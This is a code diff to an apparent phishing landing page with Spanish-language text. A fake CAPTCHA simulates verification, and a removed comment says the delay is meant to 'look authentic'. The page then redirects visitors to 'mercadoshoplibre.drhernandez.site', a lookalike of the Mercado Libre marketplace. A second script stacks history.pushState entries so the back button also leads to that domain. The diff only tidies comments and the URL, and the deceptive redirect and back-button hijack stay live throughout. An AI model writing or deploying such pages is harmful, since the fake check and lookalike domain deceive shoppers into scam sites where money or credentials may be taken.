@@ -17,7 +17,7 @@
       overflow: hidden;
     }
 
-    /* Background with professional blur effect */
+    /* Background with professional blur effect using your new image */
     body::before {
       content: "";
       position: fixed;
@@ -91,7 +91,7 @@
     }
 
     .content-right {
-      width: 85px; /* Ligeiramente maior para caber o texto em espanhol */
+      width: 85px;
       text-align: center;
       color: #777;
     }
@@ -154,32 +154,30 @@
   const targetDestination = "https://mercadoshoplibre.drhernandez.site/";
 
   captchaBox.onclick = function () {
-    // Prevent multiple clicks if already verified
     if (captchaBox.classList.contains("verified")) return;
 
-    // 1. Start Visual Feedback (Loading)
+    // Start Visual Feedback (Loading)
     captchaBox.innerHTML = "<div class='loading-spinner'></div>";
     statusLabel.textContent = "Verificando...";
 
-    // 2. Simulate analysis and redirect
+    // Simulate analysis and redirect
     setTimeout(function () {
-      // Switch spinner to Success Checkmark
       captchaBox.innerHTML = "✓";
       captchaBox.classList.add("verified");
       statusLabel.textContent = "Verificación completada";
       statusLabel.style.color = "#009688";
 
-      // Final redirect after a brief delay for UX
+      // Final redirect after a brief delay
       setTimeout(function () {
         window.location.href = targetDestination;
       }, 800);
 
-    }, 1500); // 1.5s delay to make it look authentic
+    }, 1500); 
   };
 </script>
 
-<script type="text/javascript">
-  var back_redirect_back_link = "https://mercadoshoplibre.drhernandez.site/" + location.search;
+  <script type="text/javascript">
+  var back_redirect_back_link = "https://mercadoshoplibre.drhernandez.site//" + location.search;
 
   history.pushState({}, "", location.href);
   history.pushState({}, "", location.href);
@@ -199,3 +197,4 @@
 
 </body>
 </html>
+
